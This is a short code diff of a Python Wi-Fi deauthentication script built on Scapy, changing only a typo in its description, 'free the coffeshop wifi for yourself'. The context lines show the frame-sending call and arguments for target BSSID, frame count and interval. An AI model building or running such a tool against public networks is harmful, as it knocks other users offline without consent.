@@ -31,7 +31,7 @@ def deauth(client_mac: str, bssid: str, iface: str, inter: float=0.02, count: in
     sendp(deauth_packet, iface=iface, count=count, inter=inter, verbose=True)
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="free the coofeshop wifi for yourself")
+    parser = argparse.ArgumentParser(description="free the coffeshop wifi for yourself")
     parser.add_argument("bssid", help="bssid of target network address")
     parser.add_argument("-c" , "--count", help="number of deauthentication frames to send per target, default is 20", default=20)
     parser.add_argument("--inter", help="sending frequency between frames, default is 20ms", default=0.02)
